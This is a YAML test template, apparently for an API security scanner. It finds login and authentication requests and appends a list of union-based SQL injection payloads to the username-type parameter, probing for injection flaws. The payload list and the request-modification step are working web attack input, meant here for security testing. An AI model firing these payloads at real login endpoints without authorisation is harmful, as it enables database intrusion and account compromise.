api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  url:
    contains_either:
      - login
      - signin
      - authenticate
      - auth
  request_payload:
    for_one:
      key:
        regex: "^username$|^user$|^userid$|^user_id$|^login$|^login_id$|^email$|^account$|^account_id$|^member$|^member_id$|^id$|^user_name$|^uname$|^identifier$|^user_identifier$|^admin$|^nick$|^nickname$|^handle$|^alias$|^principal$|^profile$|^profile_id$|^name$|^signin$|^auth$|^credential$|^user_login$|^user_account$|^user_email$|^employee$|^employee_id$|^operator$|^customer_id$|^client_id$|^subscriber$|^subscriber_id$|^participant$|^participant_id$|^client_id$|^userLoginID$|^client-name$"
        extract: userKey
      value:
        extract: userVal
wordLists:
  unionBasedPayloads:
    - "' UNION SELECT 'a', 'b'--"
    - "' UNION SELECT 1, 'a'--"
    - "' UNION SELECT 'a', 1--"
    - "' UNION SELECT 1, null--"
    - "' UNION SELECT null, 'a'--"
    - "' UNION SELECT 'a', null--"
    - "' UNION SELECT 1, 'a', 'b'--"
    - "' UNION SELECT 'a', 'b', 'c'--"
    - "' UNION SELECT 1, 2, 'a'--"
    - "' UNION SELECT null, 1, 'a'--"
    - "' UNION SELECT 'a', null, 1--"
    - "' UNION SELECT 1, null, null--"
    - "' UNION SELECT null, 'a', null--"
    - "' UNION SELECT null, null, 'a'--"
execute:
  type: single
  requests:
  - req:
    - modify_body_param:
        userKey: ${userVal}${unionBasedPayloads}
        
